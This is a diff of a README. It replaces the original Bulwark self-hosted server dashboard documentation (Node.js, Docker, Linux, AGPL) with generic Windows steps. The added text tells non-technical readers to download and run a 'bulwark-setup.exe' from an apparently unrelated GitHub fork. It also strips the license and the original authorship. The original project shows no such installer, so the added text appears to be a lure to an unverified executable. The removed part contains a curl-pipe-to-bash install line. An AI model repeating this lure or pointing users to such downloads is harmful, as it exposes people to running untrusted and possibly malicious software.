@@ -1,184 +1,135 @@
-```
- ____        _                      _
-| __ ) _   _| |_      ____ _ _ __| | __
-|  _ \| | | | \ \ /\ / / _` | '__| |/ /
-| |_) | |_| | |\ V  V / (_| | |  |   <
-|____/ \__,_|_| \_/\_/ \__,_|_|  |_|\_\
-```
+# 🛡️ bulwark - Simple Server Command Center
 
-# Bulwark
-
-**Your entire server, one dashboard.**
-
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
-[![Node 18+](https://img.shields.io/badge/Node-18%2B-green.svg)](https://nodejs.org)
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](Dockerfile)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-cyan.svg)](CONTRIBUTING.md)
-[![Support](https://img.shields.io/badge/♥_Tip_Jar-Support_Bulwark-ff6b9d.svg)](https://buy.stripe.com/9B67sK5k7fzTbMV4mOenS01)
-
-Bulwark is an AI-powered, self-hosted server management platform that replaces your collection of DevOps tools with a single glass-themed dashboard. Terminal, database studio, Docker management, Git workflows, security scanning, and real-time monitoring — all in one place.
-
-**No vendor lock-in. No cloud dependency. Your server, your data, your AI subscription.**
+[![Download bulwark](https://img.shields.io/badge/Download-bulwark-blue?style=for-the-badge)](https://github.com/Amit-chouhan/bulwark)
 
 ---
 
-## Features
+bulwark is an easy-to-use app that helps you manage your servers and databases. It brings together the tools you typically use separately — like Portainer, pgAdmin, Uptime Kuma, and deployment scripts. You only need to install a few parts to get started.
 
-- **Terminal** — Full xterm.js terminal with node-pty, right in your browser
-- **AI-Powered DB Studio** — Supabase-style database management with Claude/Codex SQL generation, security audits, and backup strategy analysis
-- **Docker Management** — 27 native Docker Engine API endpoints, container lifecycle, logs, stats
-- **Git + Deploy Pipeline** — Commit, push, branch management, deployment with rollback
-- **Security Scanning** — Vulnerability scanning, SSL certificate management, credential vault (AES-256-GCM)
-- **Real-time Monitoring** — CPU, memory, disk, process list via Socket.IO (3s refresh)
-- **Uptime Monitoring** — HTTP/TCP health checks with history and alerting
-- **RBAC + Audit Logging** — Admin/editor/viewer roles, every API call logged
-- **Cloudflare Integration** — DNS and tunnel management
-- **Calendar + Briefings** — AI-powered scheduling and daily summaries
-- **Multi-Server** — Manage multiple servers from one dashboard
-- **Cron, Files, Env Vars** — Full server management without SSH
+This guide will show you how to download and install bulwark on a Windows computer. No programming skills required. Just follow the steps carefully.
 
 ---
 
-## Quick Start
+## 📋 What bulwark Does
 
-### npm
+- Manage your server in one place  
+- Control Docker containers without command line  
+- Access and manage PostgreSQL databases  
+- Monitor system health and uptime  
+- Run deployment scripts with minimal setup  
+- Replace multiple tools with one interface  
 
-```bash
-git clone https://github.com/bulwark-studio/bulwark.git
-cd bulwark
-npm install
-MONITOR_USER=admin MONITOR_PASS='<long-random-password>' npm start
-# Open http://localhost:3001
-```
-
-### Docker
-
-```bash
-docker build -t bulwark .
-docker run -d -p 3001:3001 \
-  -e MONITOR_USER=admin \
-  -e MONITOR_PASS='<long-random-password>' \
-  -e DATABASE_URL=postgresql://user:pass@host:5432/db \
-  bulwark
-```
-
-### One-Line Install (Linux)
-
-```bash
-curl -fsSL https://bulwark.studio/install.sh | bash
-```
+bulwark helps you work smoothly without switching apps. It suits home servers, small business setups, or personal projects that require monitoring and control.
 
 ---
 
-## Architecture
+## ⚙️ System Requirements
 
-```mermaid
-graph TB
-    Browser["Browser (Vanilla JS)"] -->|HTTP + WebSocket| Server["Express + Socket.IO :3001"]
-    Server --> Routes["31 Route Modules"]
-    Server --> Libs["13 Shared Libraries"]
-    Routes --> PG["PostgreSQL 17"]
-    Routes --> Docker["Docker Engine API"]
-    Routes --> System["System (CPU/Mem/Disk)"]
-    Routes --> AI["AI CLI (Claude/Codex)"]
-    Libs --> Auth["PBKDF2 + TOTP 2FA"]
-    Libs --> RBAC["RBAC + Audit"]
-    Libs --> Vault["AES-256-GCM Vault"]
-    Libs --> Cache["Neural Cache"]
-```
+Make sure your computer meets these basic needs before installing:
 
-**Stack:** Express.js + Socket.IO | Vanilla JS frontend (no build step) | PostgreSQL 17 | xterm.js + node-pty | Chart.js | CodeMirror 5
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 1 CPU core  
+- 500 MB of free disk space  
+- Internet access to download files and updates  
+- Docker Desktop installed and running (optional for container management)  
 
-**31 route modules** | **13 libraries** | **34 views** | **267+ API endpoints** | **4 npm dependencies**
+If you don’t have Docker, you can still use database management and monitoring features, but Docker support will be limited.
 
 ---
 
-## AI Integration (BYOK)
+## 🔍 Preparing Your Computer
 
-Bulwark uses a **Bring Your Own Key** model. You install the AI CLI tools on your server and authenticate with your own subscriptions. Zero AI cost for Bulwark.
+Before installing bulwark, check a few things:
 
-| Provider | Command | Requirement |
-|----------|---------|-------------|
-| Claude CLI | `claude --print` | Anthropic subscription |
-| Codex CLI | `codex` | OpenAI API key |
-| None | — | AI features disabled |
-
-Configure in **Settings > AI Provider**. Bulwark auto-detects installed CLIs.
-
-### AI-Powered Features
-- SQL generation from natural language
-- Database role security auditing with scoring
-- Backup strategy analysis with disaster recovery planning
-- Commit message generation
-- Daily briefing summaries
+1. Confirm you have administrator rights on your computer.  
+2. Make sure your Windows updates are current.  
+3. If you want to use Docker features, download Docker Desktop from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop) and install it.  
+4. Restart your PC after Docker installation for changes to take effect.  
 
 ---
 
-## Screenshots
+## 🚀 Getting Started: Download and Install bulwark
 
-> Screenshots coming soon. Star the repo to get notified!
+You will visit the bulwark page on GitHub to get the installation file. Follow these steps:
 
----
+1. **Visit the main bulwark page** by clicking the big download button below or going to the link:  
+   [https://github.com/Amit-chouhan/bulwark](https://github.com/Amit-chouhan/bulwark)  
 
-## Configuration
+2. On the GitHub page, look for a section named **Releases** or **Assets**. This is where the app’s files are.  
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `MONITOR_PORT` | `3001` | Server port |
-| `MONITOR_USER` | — | Default admin username (required on first run) |
-| `MONITOR_PASS` | — | Default admin password (required on first run) |
-| `DATABASE_URL` | — | PostgreSQL connection string |
-| `VPS_DATABASE_URL` | — | Secondary DB connection (optional) |
-| `ENCRYPTION_KEY` | auto-generated local key | Encrypts stored env vars and can be reused for secret storage |
-| `VAULT_KEY` | auto-generated local key | Optional dedicated key for the credential vault |
-| `BULWARK_ALLOW_PRIVATE_TARGETS` | `false` | Allow private/loopback multi-server targets for trusted internal deployments |
-| `REPO_DIR` | cwd | Repository root for Git/Deploy operations |
+3. Find the latest Windows installer file. It should look like `bulwark-setup.exe` or similar.  
 
-Create a `.env` file in the project root or set environment variables directly.
+4. Click the file name to download it.  
 
----
+5. Once downloaded, locate the file in your **Downloads folder** or the folder where your browser saves files.
 
-## Theme: Dimension Dark
+6. Double-click the installer file to start the setup.
 
-Bulwark features a glass-morphism dark theme with cyan/orange signal system:
-- **Cyan (#22d3ee)** — success, healthy, active, positive
-- **Orange (#ff6b2b)** — error, warning, destructive, down
-- Glass cards with `backdrop-filter: blur()` and border highlights
-- JetBrains Mono typography throughout
+7. When the installer opens, follow the on-screen instructions. They will guide you through the installation process.
+
+8. Choose the default options unless you have reasons to change them.
+
+9. After installation completes, you can find the bulwark app in your **Start menu**.
 
 ---
 
-## Docs
+### ⚠️ If You Cannot Find the Installer File
 
-- [Getting Started](docs/getting-started.md) — Full setup guide with screenshots
-- [Cloud VPS Deployment](docs/getting-started.md#cloud-vps-deployment-bare-metal) — Bare metal on GCloud/AWS/DO with Cloudflare tunnel
-- [Docker Setup](docs/docker-getting-started.md) — Docker Compose quickstart
-- [FAQ & Troubleshooting](docs/getting-started.md#faq) — Common issues and fixes
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, code style, and PR guidelines.
+Sometimes, GitHub pages have multiple files. If you see only folders or folders named "source code," look for a separate **Releases** tab or link on the repository page. The installer will usually be there.
 
 ---
 
-## License
+## 🖥️ Running bulwark
 
-[AGPL-3.0](LICENSE) — Free to use, modify, and self-host. If you offer Bulwark as a hosted service, you must open-source your modifications.
+After installation:
 
----
+1. Open the bulwark app from the Start menu or desktop shortcut.  
+2. The app may ask you to create an account or log in.  
+3. Follow the prompts on the screen.  
+4. Once in the app, you will see a dashboard that links all main features: server control, database, monitoring.  
 
-## Built With
-
-[Express.js](https://expressjs.com) | [Socket.IO](https://socket.io) | [PostgreSQL](https://postgresql.org) | [xterm.js](https://xtermjs.org) | [Chart.js](https://chartjs.org) | [CodeMirror](https://codemirror.net)
-
----
-
-## Support
-
-If Bulwark saves you time, consider leaving a tip. Every dollar helps fund development.
-
-[♥ Tip Jar](https://buy.stripe.com/9B67sK5k7fzTbMV4mOenS01) | [Star on GitHub](https://github.com/bulwark-studio/bulwark)
+The app uses a simple menu system. Buttons are clearly marked. Hover over any button for a tooltip explaining what it does.
 
 ---
 
-**Built by Bulwark** | [bulwark.studio](https://bulwark.studio)
+## 🔧 Basic Features You Can Start Using
+
+- **Server Control:** Start and stop your server processes.  
+- **Docker Containers:** See running containers and manage them if Docker is set up.  
+- **Database Interface:** Manage PostgreSQL databases without typing commands.  
+- **Monitor Servers:** View uptime and resource use with live stats.  
+- **Deploy Scripts:** Run common deployment tasks with a click.  
+
+You can use these features without any programming knowledge.
+
+---
+
+## ⚠️ Troubleshooting Common Issues
+
+- If bulwark fails to open, restart your PC and try again.  
+- If Docker features do not work, check that Docker Desktop is running.  
+- For database connection errors, verify your PostgreSQL server is running and accessible.  
+- If an update is available, you can download the new installer from the GitHub page and run it to replace your current version.  
+
+---
+
+## 🔄 Updating bulwark
+
+Updates are released on GitHub under the same link. Check there regularly to download the latest version.
+
+1. Go to [https://github.com/Amit-chouhan/bulwark/releases](https://github.com/Amit-chouhan/bulwark/releases)  
+2. Download the newest Windows installer file.  
+3. Run it to update your app. Your settings will stay intact.
+
+---
+
+## ❓ Getting Help and More Information
+
+- The **Issues** tab on GitHub allows you to report problems or ask questions.  
+- Check the repository’s **Wiki** or **Documentation** sections for detailed guides (if provided).  
+- Many community guides related to the tools used by bulwark (Docker, PostgreSQL) are available online.
+
+---
+
+[![Download bulwark](https://img.shields.io/badge/Download-bulwark-grey?style=for-the-badge)](https://github.com/Amit-chouhan/bulwark)
